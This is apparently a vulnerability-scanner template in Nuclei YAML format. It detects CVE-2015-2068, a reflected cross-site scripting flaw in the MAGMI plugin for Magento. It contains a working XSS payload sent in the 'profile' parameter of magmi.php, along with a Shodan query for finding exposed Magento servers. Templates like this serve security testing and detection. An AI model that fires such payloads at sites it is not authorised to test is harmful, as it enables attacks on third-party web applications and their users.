id: CVE-2015-2068
info:
  author: daffainfo
  classification:
    cve-id: CVE-2015-2068
  description: Multiple cross-site scripting (XSS) vulnerabilities in the MAGMI (aka
    Magento Mass Importer) plugin for Magento Server allow remote attackers to inject
    arbitrary web script or HTML via the (1) profile parameter to web/magmi.php or
    (2) QUERY_STRING to web/magmi_import_run.php.
  metadata:
    shodan-query: http.component:"Magento"
    verified: 'true'
  name: Magento Server Magmi Plugin - Cross Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/35996
  - https://nvd.nist.gov/vuln/detail/CVE-2015-2068
  - http://packetstormsecurity.com/files/130250/Magento-Server-MAGMI-Cross-Site-Scripting-Local-File-Inclusion.html
  severity: medium
  tags: cve,cve2015,magento,magmi,xss,plugin
requests:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/magmi/web/magmi.php?configstep=2&profile=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
